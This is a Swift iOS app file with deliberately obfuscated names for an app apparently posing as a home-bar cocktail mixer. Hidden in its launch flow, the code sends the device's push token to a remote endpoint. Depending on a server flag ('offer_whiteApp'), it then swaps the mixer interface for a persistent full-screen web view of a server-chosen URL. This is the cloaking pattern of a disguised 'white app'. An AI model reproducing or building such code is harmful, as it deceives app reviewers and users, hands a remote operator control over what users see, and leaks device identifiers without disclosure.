
import UIKit
import SwiftUI
import FirebaseCore
import FirebaseMessaging
import UserNotifications

extension Notification.Name {
    static let pushPermissionResolved = Notification.Name("pushPermissionResolved")
    static let fcmTokenReceived = Notification.Name("fcmTokenReceived")
}

class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?

    static var hffpgzmzuifnvnzauozu = UIInterfaceOrientationMask.all
    func application(_ bjustuefwpgoyyeloe: UIApplication, supportedInterfaceOrientationsFor omainxrhiscpjwpbmkta: UIWindow?) -> UIInterfaceOrientationMask {
        AppDelegate.hffpgzmzuifnvnzauozu
    }

    func application(_ vkpqulmnpmkombuouie: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {

        FirebaseApp.configure()

        Messaging.messaging().delegate = self

        UNUserNotificationCenter.current().delegate = self
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound]) { yvuueexatbktrqeep, lpukokahkqbzujzniuc in
            if let ojhezjojaexwwcqamur = lpukokahkqbzujzniuc {
            }
            DispatchQueue.main.async {
                NotificationCenter.default.post(name: .pushPermissionResolved, object: nil)
            }
        }

        vkpqulmnpmkombuouie.registerForRemoteNotifications()

        Messaging.messaging().token { iozkkjkzhyvuniebeli, sszuaehnhvikriuom in
            if let token = iozkkjkzhyvuniebeli {
                UserDefaults.standard.set(token, forKey: "FCMToken")
                DispatchQueue.main.async {
                    NotificationCenter.default.post(name: .fcmTokenReceived, object: nil)
                }
            } else if let qtcpaaogjwenbittmaoggk = sszuaehnhvikriuom {
            }
        }

        return true
    }


    func application(_ awylaseppechuxcibizx: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken bowufhcvrtqhugy: Data) {
        let ofofcvywuivezwemif = bowufhcvrtqhugy.map { String(format: "%02.2hhx", $0) }.joined()
        Messaging.messaging().apnsToken = bowufhcvrtqhugy
    }

    func application(_ bghgcybfxnqfimnr: UIApplication, didFailToRegisterForRemoteNotificationsWithError biesyialsoxcewi: Error) {
    }
}


extension AppDelegate: UNUserNotificationCenterDelegate {

    func userNotificationCenter(_ hxxmpjeiorcieejocf: UNUserNotificationCenter,
                                willPresent lvgmquuxaaxaomesnpa: UNNotification,
                                withCompletionHandler oefaicyxnzkueaj: @escaping (UNNotificationPresentationOptions) -> Void) {
        let userInfo = lvgmquuxaaxaomesnpa.request.content.userInfo
        oefaicyxnzkueaj([.banner, .badge, .sound])
    }

    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                didReceive bjopjosuuozgejh: UNNotificationResponse,
                                withCompletionHandler completionHandler: @escaping () -> Void) {
        let aszgbroojluhwooak = bjopjosuuozgejh.notification.request.content.userInfo
        completionHandler()
    }
}


extension AppDelegate: MessagingDelegate {

    func messaging(_ oojhbcsgqruxxul: Messaging, didReceiveRegistrationToken fcmToken: String?) {
        guard let uwcarxocfqoxuixis = fcmToken else {
            return
        }
        UserDefaults.standard.set(uwcarxocfqoxuixis, forKey: "FCMToken")
        DispatchQueue.main.async {
            NotificationCenter.default.post(name: .fcmTokenReceived, object: nil)
        }
    }
}


struct Uawweronfcolaia {
    enum Oevuiiyasagewhlcico {
        static var ckikptuyaeiiaevwu: String { "https://clucktailhome.xyz/clucktailhomemix.json" }
    }

    enum Cusggtyjlnfmovxsh {
        static var lchqccjpnnrmuxm: String { "Content-Type" }
        static var havgauisouyqorakqkqix: String { "application/json" }
        static var xzuajvmvyimocbhhkv: String { "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1" }
        static var cuevaraaceboimiqc: String { "Unknown error" }
        static var vwphiocyozoilxlqokberq: String { "Error: " }
        static var iiancalzhteispwzeknwo: String { "firstOpen" }
        static var ehkuuminaoehloooaupjs: String { "wasOpened" }
        static var wnozlrbuivxkiyejeoew: String { "orientation" }
    }
}


struct Auyhhiurlluoncfrc: View {
    @State var mevaawqcokgplq: Bool = true
    let jqktpituqgfxcareor: String

    var body: some View {
        ZStack {
            Awkwkzhsnlgjewuuszc(bteqnckeeajoieeupyu: jqktpituqgfxcareor, fkgspghrzuxubilbakwqo: nil)
                .background(Color.black.ignoresSafeArea())
                .edgesIgnoringSafeArea(.bottom)
                .blur(radius: mevaawqcokgplq ? 15 : 0)

            if mevaawqcokgplq {
                ProgressView()
                    .controlSize(.large)
                    .tint(.pink)
            }
        }
        .onAppear {
            AppDelegate.hffpgzmzuifnvnzauozu = .all

            DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
                mevaawqcokgplq = false
            }
        }
    }
}

private enum Ezyazukqieovriwha: Equatable {
    case nzywjtqeiwtbxp
    case owyiqvwuiaqgquhkev
    case cnlacqseouaexqjkgyoeb(String)
}

@main
struct HomeBarMixOptimizerApp: App {
    @State private var xmeiypolekwolcowpoogo: Ezyazukqieovriwha = .nzywjtqeiwtbxp
    @State private var jjaiftxjkxxkocwgwilwe: Bool = false
    @State private var moonfxjsvvalsqi: Bool = false

    @AppStorage(Uawweronfcolaia.Cusggtyjlnfmovxsh.iiancalzhteispwzeknwo) var scucwaibmopxwziy: Bool = true
    @AppStorage(Uawweronfcolaia.Cusggtyjlnfmovxsh.ehkuuminaoehloooaupjs) var eusfceuwgltiltut: Bool = false
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate

    var body: some Scene {
        WindowGroup {
            Group {
                switch xmeiypolekwolcowpoogo {
                case .nzywjtqeiwtbxp:
                    SplashView()
                        .onAppear {
                            AppDelegate.hffpgzmzuifnvnzauozu = .portrait
                            UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: Uawweronfcolaia.Cusggtyjlnfmovxsh.wnozlrbuivxkiyejeoew)
                            eusfceuwgltiltut = true

                            if !scucwaibmopxwziy {
                                if let exlahueiikvepj = UserDefaults.standard.string(forKey: "savedFinalUrl"),
                                   !exlahueiikvepj.isEmpty,
                                   !krkbyqjcyaifivuoqrppyi(exlahueiikvepj) {
                                    ufuybcamaejpimcjcufigi(exlahueiikvepj) { isValid in
                                        if isValid {
                                            xmeiypolekwolcowpoogo = .cnlacqseouaexqjkgyoeb(exlahueiikvepj)
                                        } else {
                                            UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
                                            xmeiypolekwolcowpoogo = .owyiqvwuiaqgquhkev
                                        }
                                    }
                                } else {
                                    if let exlahueiikvepj = UserDefaults.standard.string(forKey: "savedFinalUrl"),
                                       krkbyqjcyaifivuoqrppyi(exlahueiikvepj) {
                                        UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
                                    }
                                    xmeiypolekwolcowpoogo = .owyiqvwuiaqgquhkev
                                }
                            } else {
                                DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
                                    guard self.xmeiypolekwolcowpoogo == .nzywjtqeiwtbxp else { return }
                                    moonfxjsvvalsqi = true
                                    if jjaiftxjkxxkocwgwilwe {
                                        kzovneuahcmbzgxzakqt()
                                    }
                                }
                            }
                        }
                        .onReceive(NotificationCenter.default.publisher(for: .pushPermissionResolved)) { _ in
                            guard scucwaibmopxwziy else { return }
                            jjaiftxjkxxkocwgwilwe = true
                            if moonfxjsvvalsqi {
                                kzovneuahcmbzgxzakqt()
                            }
                        }
                        .onReceive(NotificationCenter.default.publisher(for: .fcmTokenReceived)) { _ in
                            guard scucwaibmopxwziy else { return }
                            moonfxjsvvalsqi = true
                            if jjaiftxjkxxkocwgwilwe {
                                kzovneuahcmbzgxzakqt()
                            }
                        }

                case .owyiqvwuiaqgquhkev:
                    HomeBarMixOptimizer()

                case .cnlacqseouaexqjkgyoeb(let exninppvhepclhwaiuyjw):
                    Awkwkzhsnlgjewuuszc(bteqnckeeajoieeupyu: exninppvhepclhwaiuyjw, fkgspghrzuxubilbakwqo: {
                        UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
                        xmeiypolekwolcowpoogo = .owyiqvwuiaqgquhkev
                    })
                    .preferredColorScheme(.dark)
                    .onAppear {
                        AppDelegate.hffpgzmzuifnvnzauozu = .all
                    }
                }
            }
        }
    }

    private func krkbyqjcyaifivuoqrppyi(_ pvfyfyaafcnkmziso: String) -> Bool {
        guard let zhqvogoeqtetvag = URL(string: pvfyfyaafcnkmziso), let hyememlnaeayuopamyre = zhqvogoeqtetvag.host?.lowercased() else { return false }
        return hyememlnaeayuopamyre == "google.com" || hyememlnaeayuopamyre == "www.google.com"
    }

    private func ufuybcamaejpimcjcufigi(_ weeyucfwuloxtfwaphaho: String, completion: @escaping (Bool) -> Void) {
        guard let beqovnuytbumiezo = URL(string: weeyucfwuloxtfwaphaho) else {
            DispatchQueue.main.async { completion(false) }
            return
        }

        var wvcygtikbqhpcciyuyhl = URLRequest(url: beqovnuytbumiezo)
        wvcygtikbqhpcciyuyhl.httpMethod = "HEAD"
        wvcygtikbqhpcciyuyhl.setValue(Uawweronfcolaia.Cusggtyjlnfmovxsh.xzuajvmvyimocbhhkv, forHTTPHeaderField: "User-Agent")
        wvcygtikbqhpcciyuyhl.timeoutInterval = 5

        let kmjjjfnczlivsiooq = URLSession(configuration: .default)
        let ucsigwgsnxbilcufe = kmjjjfnczlivsiooq.dataTask(with: wvcygtikbqhpcciyuyhl) { _, ieosotzjmohxzliqhen, ovhvwypxzrkmcst in
            if let _ = ovhvwypxzrkmcst {
                DispatchQueue.main.async { completion(false) }
                return
            }

            if let uluyapcukahvekxhyi = ieosotzjmohxzliqhen as? HTTPURLResponse,
               let uxtiaumhobuwcocufuxhz = uluyapcukahvekxhyi.url {
                let yegqalrracpeqguxl = !self.krkbyqjcyaifivuoqrppyi(uxtiaumhobuwcocufuxhz.absoluteString)
                if !yegqalrracpeqguxl {
                    UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
                }
                DispatchQueue.main.async { completion(yegqalrracpeqguxl) }
            } else {
                DispatchQueue.main.async { completion(false) }
            }
        }
        ucsigwgsnxbilcufe.resume()
    }

    private func obhlzqsbeuswbea(_ hivspxvpbymqgmaj: String) {
        if krkbyqjcyaifivuoqrppyi(hivspxvpbymqgmaj) {
            UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
            self.xmeiypolekwolcowpoogo = .owyiqvwuiaqgquhkev
            self.scucwaibmopxwziy = false
            return
        }

        ufuybcamaejpimcjcufigi(hivspxvpbymqgmaj) { isValid in
            if isValid {
                UserDefaults.standard.set(hivspxvpbymqgmaj, forKey: "savedFinalUrl")
                self.xmeiypolekwolcowpoogo = .cnlacqseouaexqjkgyoeb(hivspxvpbymqgmaj)
                self.scucwaibmopxwziy = false
            } else {
                UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
                self.xmeiypolekwolcowpoogo = .owyiqvwuiaqgquhkev
                self.scucwaibmopxwziy = false
            }
        }
    }

    private func kzovneuahcmbzgxzakqt() {
        var agmocpuarmoibjxfng = Uawweronfcolaia.Oevuiiyasagewhlcico.ckikptuyaeiiaevwu

        if let wneompuznqkqqfuavkmakx = UserDefaults.standard.string(forKey: "FCMToken"), !wneompuznqkqqfuavkmakx.isEmpty  {
            let euouiszvvaziikyirs = wneompuznqkqqfuavkmakx.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? wneompuznqkqqfuavkmakx
            agmocpuarmoibjxfng += "?fcm_token=\(euouiszvvaziikyirs)"
        }


        guard let pejoiwscvpjsxj = URL(string: agmocpuarmoibjxfng) else {
            xmeiypolekwolcowpoogo = .owyiqvwuiaqgquhkev
            scucwaibmopxwziy = false
            return
        }


        var mbunyvpeintjhko = URLRequest(url: pejoiwscvpjsxj)
        mbunyvpeintjhko.httpMethod = "GET"
        mbunyvpeintjhko.setValue(Uawweronfcolaia.Cusggtyjlnfmovxsh.havgauisouyqorakqkqix, forHTTPHeaderField: Uawweronfcolaia.Cusggtyjlnfmovxsh.lchqccjpnnrmuxm)
        mbunyvpeintjhko.setValue(Uawweronfcolaia.Cusggtyjlnfmovxsh.xzuajvmvyimocbhhkv, forHTTPHeaderField: "User-Agent")

        URLSession.shared.dataTask(with: mbunyvpeintjhko) { wwhorstnfonarviup, hleepnashawbeq, error in
            if let error = error {
                DispatchQueue.main.async {
                    self.xmeiypolekwolcowpoogo = .owyiqvwuiaqgquhkev
                    self.scucwaibmopxwziy = false
                }
                return
            }

            if let imzpwjsbriviscorevcij = hleepnashawbeq as? HTTPURLResponse {
                if imzpwjsbriviscorevcij.statusCode != 200 {
                    DispatchQueue.main.async {
                        self.xmeiypolekwolcowpoogo = .owyiqvwuiaqgquhkev
                        self.scucwaibmopxwziy = false
                    }
                    return
                }
            }

            guard let wwhorstnfonarviup = wwhorstnfonarviup, !wwhorstnfonarviup.isEmpty else {
                DispatchQueue.main.async {
                    self.xmeiypolekwolcowpoogo = .owyiqvwuiaqgquhkev
                    self.scucwaibmopxwziy = false
                }
                return
            }

            var ngrqjlmoapwziyqfav = wwhorstnfonarviup
            if wwhorstnfonarviup.count >= 3, wwhorstnfonarviup.prefix(3).elementsEqual([0xEF, 0xBB, 0xBF]) {
                ngrqjlmoapwziyqfav = wwhorstnfonarviup.dropFirst(3)
            }

            guard var uneunuzvaxahqcaojx = String(data: ngrqjlmoapwziyqfav, encoding: .utf8) else {
                DispatchQueue.main.async {
                    self.xmeiypolekwolcowpoogo = .owyiqvwuiaqgquhkev
                    self.scucwaibmopxwziy = false
                }
                return
            }

            uneunuzvaxahqcaojx = uneunuzvaxahqcaojx
                .replacingOccurrences(of: "\u{00A0}", with: " ")
                .replacingOccurrences(of: "\u{FEFF}", with: "")
                .trimmingCharacters(in: .whitespacesAndNewlines)


            guard let hfcnaoolnzouonopeoa = uneunuzvaxahqcaojx.data(using: .utf8) else {
                DispatchQueue.main.async {
                    self.xmeiypolekwolcowpoogo = .owyiqvwuiaqgquhkev
                    self.scucwaibmopxwziy = false
                }
                return
            }

            do {
                if let sukzaothfhwuwvr = try JSONSerialization.jsonObject(with: hfcnaoolnzouonopeoa, options: [.allowFragments]) as? [[String: Any]] {

                    let cgjyoyqaaaxaooe = sukzaothfhwuwvr.count > 1 || !sukzaothfhwuwvr.contains { ($0["name"] as? String) == "offer_whiteApp" }

                    if cgjyoyqaaaxaooe {
                        DispatchQueue.main.async {
                            UserDefaults.standard.removeObject(forKey: "savedFinalUrl")
                            self.xmeiypolekwolcowpoogo = .owyiqvwuiaqgquhkev
                            self.scucwaibmopxwziy = false
                        }
                    } else if let igywchokxyerbooaetz = sukzaothfhwuwvr.first,
                              let eysvotfvigoomrr = igywchokxyerbooaetz["google_link"] as? String,
                              !eysvotfvigoomrr.isEmpty {

                        DispatchQueue.main.async {
                            self.obhlzqsbeuswbea(eysvotfvigoomrr)
                        }
                    } else {
                        DispatchQueue.main.async {
                            self.xmeiypolekwolcowpoogo = .owyiqvwuiaqgquhkev
                            self.scucwaibmopxwziy = false
                        }
                    }
                } else {
                    DispatchQueue.main.async {
                        self.xmeiypolekwolcowpoogo = .owyiqvwuiaqgquhkev
                        self.scucwaibmopxwziy = false
                    }
                }
            } catch {
                print("\(Uawweronfcolaia.Cusggtyjlnfmovxsh.vwphiocyozoilxlqokberq)\(error.localizedDescription)")
                DispatchQueue.main.async {
                    self.xmeiypolekwolcowpoogo = .owyiqvwuiaqgquhkev
                    self.scucwaibmopxwziy = false
                }
            }
        }.resume()
    }
}

import SwiftUI
import WebKit

struct Qeiyaqpryaphrhn: UIViewRepresentable {
    let taauhjaxiyijijj: String
    var suqetpcqxeirojrsm: (() -> Void)? = nil
    @Binding var eheyxetclunihaamsh: WKWebView?
    @Binding var oatpmithcnmuboifghgpua: WKWebView?

    func makeUIView(context: Context) -> WKWebView {
        let kyaqootxosoqfmkiimmrlj = WKPreferences()
        kyaqootxosoqfmkiimmrlj.javaScriptCanOpenWindowsAutomatically = true

        let wuahchglmywggqnxbs = WKWebViewConfiguration()
        wuahchglmywggqnxbs.preferences = kyaqootxosoqfmkiimmrlj
        wuahchglmywggqnxbs.allowsInlineMediaPlayback = true
        wuahchglmywggqnxbs.defaultWebpagePreferences.allowsContentJavaScript = true
        wuahchglmywggqnxbs.applicationNameForUserAgent = Uawweronfcolaia.Cusggtyjlnfmovxsh.xzuajvmvyimocbhhkv

        let hjcopxvouemwzmsk = WKWebView(frame: .zero, configuration: wuahchglmywggqnxbs)
        hjcopxvouemwzmsk.navigationDelegate = context.coordinator
        hjcopxvouemwzmsk.uiDelegate = context.coordinator
        hjcopxvouemwzmsk.allowsBackForwardNavigationGestures = true
        hjcopxvouemwzmsk.isOpaque = false
        hjcopxvouemwzmsk.backgroundColor = .black
        hjcopxvouemwzmsk.scrollView.backgroundColor = .black

        if let loeblvtvuegmkqeb = URL(string: taauhjaxiyijijj) {
            hjcopxvouemwzmsk.load(URLRequest(url: loeblvtvuegmkqeb))
        }

        DispatchQueue.main.async { self.eheyxetclunihaamsh = hjcopxvouemwzmsk }
        return hjcopxvouemwzmsk
    }

    func updateUIView(_ keibyzbwakfxxah: WKWebView, context: Context) {}

    func makeCoordinator() -> Coordinator {
        Coordinator(qepkmaezzakuyvamylae: suqetpcqxeirojrsm, owxzofalcjsavy: $oatpmithcnmuboifghgpua)
    }

    final class Coordinator: NSObject, WKNavigationDelegate, WKUIDelegate {
        private let iymxmuogabziui: (() -> Void)?
        @Binding var urnxcizimuymoe: WKWebView?

        init(qepkmaezzakuyvamylae: (() -> Void)?, owxzofalcjsavy: Binding<WKWebView?>) {
            self.iymxmuogabziui = qepkmaezzakuyvamylae
            self._urnxcizimuymoe = owxzofalcjsavy
            super.init()
        }

        func webView(_ zcimupefweoyapxiuliu: WKWebView, createWebViewWith irrkaujkbihyxrkuo: WKWebViewConfiguration, for tbputeamiirsqjxwvnf: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            if tbputeamiirsqjxwvnf.targetFrame?.isMainFrame != true {
                let iutxfnappjioubiewgi = WKWebView(frame: zcimupefweoyapxiuliu.bounds, configuration: irrkaujkbihyxrkuo)
                iutxfnappjioubiewgi.navigationDelegate = self
                iutxfnappjioubiewgi.uiDelegate = self
                zcimupefweoyapxiuliu.addSubview(iutxfnappjioubiewgi)
                DispatchQueue.main.async { self.urnxcizimuymoe = iutxfnappjioubiewgi }
                return iutxfnappjioubiewgi
            }
            return nil
        }

        func webViewDidClose(_ nnzfleuxqjyziehecws: WKWebView) {
            if nnzfleuxqjyziehecws == urnxcizimuymoe {
                urnxcizimuymoe?.removeFromSuperview()
                DispatchQueue.main.async { self.urnxcizimuymoe = nil }
            }
        }

        private func eupazyeeoubuiebioeuvis(_ psguooqihsojseuqegr: URL?) -> Bool {
            guard let lufoqhteeyhyevqeoczvso = psguooqihsojseuqegr else { return false }
            let ceeqwzphaueiubs = lufoqhteeyhyevqeoczvso.absoluteString.lowercased()
            let qgatiqsefcewejni = lufoqhteeyhyevqeoczvso.host?.lowercased() ?? ""
            if qgatiqsefcewejni.contains("accounts.google.com") { return true }
            if qgatiqsefcewejni.contains("googleapis.com") && ceeqwzphaueiubs.contains("oauth") { return true }
            return false
        }

        func webView(_ xsnlmimzsebxzmtbfmwu: WKWebView, decidePolicyFor eovxnmlhupwcaqovaa: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {

            let pvnaaubumqgzepqxmpi = """
        var as=document.getElementsByTagName('a');
        if(as){for (var i=0;i<as.length;i++){
            if(as[i].getAttribute('target')=='_blank'){as[i].setAttribute('target','_self');}
        }}
        """
            xsnlmimzsebxzmtbfmwu.evaluateJavaScript(pvnaaubumqgzepqxmpi, completionHandler: nil)

            let peqauigejmzzguzy = eovxnmlhupwcaqovaa.request.url
            if eovxnmlhupwcaqovaa.navigationType == .other,
               eupazyeeoubuiebioeuvis(peqauigejmzzguzy),
               let kywqasjuvpkvgibej = xsnlmimzsebxzmtbfmwu.url?.host?.lowercased(),
               !kywqasjuvpkvgibej.contains("google.com") {
                decisionHandler(.cancel)
                let oerzooptnflpkaipc = xsnlmimzsebxzmtbfmwu.backForwardList.backList
                if let qkvooahioaechx = oerzooptnflpkaipc.last(where: {
                    let znmwaqvaqvboreg = $0.url.host?.lowercased() ?? ""
                    let ceqlahyezoautrejhzsaut = $0.url.absoluteString.lowercased()
                    return !znmwaqvaqvboreg.contains("google.com") && !ceqlahyezoautrejhzsaut.contains("accounts.google.com")
                }) {
                    xsnlmimzsebxzmtbfmwu.go(to: qkvooahioaechx)
                }
                return
            }

            if eovxnmlhupwcaqovaa.navigationType == .linkActivated {
                xsnlmimzsebxzmtbfmwu.load(eovxnmlhupwcaqovaa.request)
                decisionHandler(.cancel)
                return
            }
            decisionHandler(.allow)
        }

        func webView(_ ruzyoarfjaieibj: WKWebView, decidePolicyFor soeeicqiuplhetuhnul: WKNavigationResponse, decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
            decisionHandler(.allow)
        }

        func webView(_ vzvfoikxwqfcskxof: WKWebView, didFinish negarkshuvyecnoyygy: WKNavigation!) {
            vzvfoikxwqfcskxof.allowsBackForwardNavigationGestures = true
            vzvfoikxwqfcskxof.configuration.mediaTypesRequiringUserActionForPlayback = .all
            vzvfoikxwqfcskxof.configuration.allowsInlineMediaPlayback = false
            vzvfoikxwqfcskxof.configuration.allowsAirPlayForMediaPlayback = false

            if let oornjekhofaszb = vzvfoikxwqfcskxof.url?.absoluteString {
                if !eupazyeeoubuiebioeuvis(vzvfoikxwqfcskxof.url) {
                    UserDefaults.standard.set(oornjekhofaszb, forKey: "savedFinalUrl")
                }
            }
        }
    }
}

struct Awkwkzhsnlgjewuuszc: View {
    let bteqnckeeajoieeupyu: String
    var fkgspghrzuxubilbakwqo: (() -> Void)? = nil
    @State private var atuveyfrlloabiuwotrf: WKWebView?
    @State private var wuqausghcczevzefubpb: WKWebView?

    var body: some View {
        ZStack {
            Qeiyaqpryaphrhn(taauhjaxiyijijj: bteqnckeeajoieeupyu,
                    suqetpcqxeirojrsm: fkgspghrzuxubilbakwqo,
                    eheyxetclunihaamsh: $atuveyfrlloabiuwotrf,
                    oatpmithcnmuboifghgpua: $wuqausghcczevzefubpb)
            .background(Color.black.ignoresSafeArea())

            VStack {
                HStack {
                    Button(action: { hbaebcyshzrhzkkhrzoieh() }) {
                        Image(systemName: "chevron.backward.circle.fill")
                            .resizable()
                            .frame(width: 20, height: 20)
                            .foregroundColor(.white)
                    }
                    .padding(.leading, 20)
                    .padding(.top, 15)
                    Spacer()
                }
                Spacer()
            }
            .ignoresSafeArea()
        }
        .statusBarHidden(true)
    }

    private func tgrzpshimineaoohxnywuo(_ iojvazeeuhoaao: URL) -> Bool {
        let iuzsaqovkvuovvmmul = iojvazeeuhoaao.absoluteString.lowercased()
        let zxfusrfccxkzwoi = iojvazeeuhoaao.host?.lowercased() ?? ""
        if zxfusrfccxkzwoi.contains("accounts.google.com") || zxfusrfccxkzwoi.contains("googleapis.com") { return true }
        if iuzsaqovkvuovvmmul.contains("accounts.google.com") || iuzsaqovkvuovvmmul.contains("oauth2") && iuzsaqovkvuovvmmul.contains("google") { return true }
        return false
    }

    private func hbaebcyshzrhzkkhrzoieh() {
        if let aolugfqoipqahmu = wuqausghcczevzefubpb {
            aolugfqoipqahmu.removeFromSuperview()
            wuqausghcczevzefubpb = nil
            return
        }

        guard let iequyvvybsyuahojtv = atuveyfrlloabiuwotrf, iequyvvybsyuahojtv.canGoBack else { return }

        let ikvvxobiemgaqixpltxaug = iequyvvybsyuahojtv.url.map { tgrzpshimineaoohxnywuo($0) } ?? false

        if ikvvxobiemgaqixpltxaug {
            let lhkuqhfxhalknbw = iequyvvybsyuahojtv.backForwardList.backList
            if let hcuaaapzcwunojeqi = lhkuqhfxhalknbw.last(where: { !tgrzpshimineaoohxnywuo($0.url) }) {
                iequyvvybsyuahojtv.go(to: hcuaaapzcwunojeqi)
            } else {
                iequyvvybsyuahojtv.goBack()
            }
        } else {
            iequyvvybsyuahojtv.goBack()
        }
    }
}

struct HomeBarMixOptimizer: View {
    @StateObject private var dataStore = AppDataStore()

    init() {
        UITableView.appearance().showsVerticalScrollIndicator = false
        UITableView.appearance().showsHorizontalScrollIndicator = false
        UITextView.appearance().showsVerticalScrollIndicator = false
        UITextView.appearance().showsHorizontalScrollIndicator = false
    }

    var body: some View {
        RootTabView()
            .environmentObject(dataStore)
            .environment(\.hbAppTheme, dataStore.hbAppTheme)
    }
}
